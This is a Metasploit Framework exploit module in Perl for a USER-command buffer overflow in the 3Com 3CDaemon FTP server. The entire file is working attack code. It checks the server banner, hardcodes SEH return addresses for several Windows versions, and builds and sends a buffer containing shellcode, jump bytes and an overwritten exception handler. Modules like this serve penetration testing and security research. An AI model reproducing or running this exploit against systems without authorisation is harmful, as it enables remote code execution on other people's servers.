##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::3com_3cdaemon_ftp_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
	'Name'  => '3Com 3CDaemon FTP Server Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	
	'UserOpts'  => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
	},

	'Payload' => 
	{
		'Space'     => 224,
		'BadChars'  => "\x00\x0a\x20\x0d",
		'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500					
		'Keys'		=> ['+ws2ord'],
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the 3Com 3CDaemon
		FTP service. This package is being distributed from the 3Com
		web site and is recommended in numerous support documents. This 
		module uses the USER command to trigger the overflow.
	}),

	'Refs'    =>	
	[
		['BID', '12155'],
		['URL', 'ftp://ftp.3com.com/pub/utilbin/win32/3cdv2r10.zip'], 
	],
	
	# This application loads no non-system DLLs, the ImageBase starts with
	# a null byte, and the overflow requires a \r\n to trigger the bug :-(
	'Targets' => 
	[	
		['Windows 2000 English',		0x75022ac4 ], # ws2help.dll
		['Windows XP English SP0/SP1',	0x71aa32ad ], # ws2help.dll
		['Windows NT 4.0 SP4/SP5/SP6',	0x77681799 ], # ws2help.dll
		# Windows 2003 and Windows XP SP2 break SEH returns to system modules...
	],
				
	'Keys' => ['ftp'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}
	
	my $banner = $s->Recv(-1, 5);
	$banner =~ s/\r|\n//g;
	
	$s->Close;
	
	if ($banner =~ /3Com 3CDaemon FTP Server Version 2\.0/) {
		$self->PrintLine("[*] Vulnerable FTP server: $banner");
		return $self->CheckCode('Detected');
	}
	
	$self->PrintLine("[*] Unknown FTP server: $banner");
	return $self->CheckCode('Safe');	
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	# Overwrite the SEH frame and throw an exception
	my $user = Pex::Text::EnglishText(2048);
	
	# The actual shellcode (small size, but we can use ws2ord)
	substr($user, 0, length($shellcode), $shellcode);

	# Jump to the beginning of the shellcode
	substr($user, 224, 5, "\xe9\x1b\xff\xff\xff");

	# Jump to a bigger jump above us
	substr($user, 229, 2, "\xeb\xf9");
	
	# Return to a pop/pop/ret in the executable
	substr($user, 233, 4, pack('V', $target->[1]));
	
	$s->Send("USER $user\r\n\r\n");
	$s->Recv(-1, 5);
	
	return;
}

1;
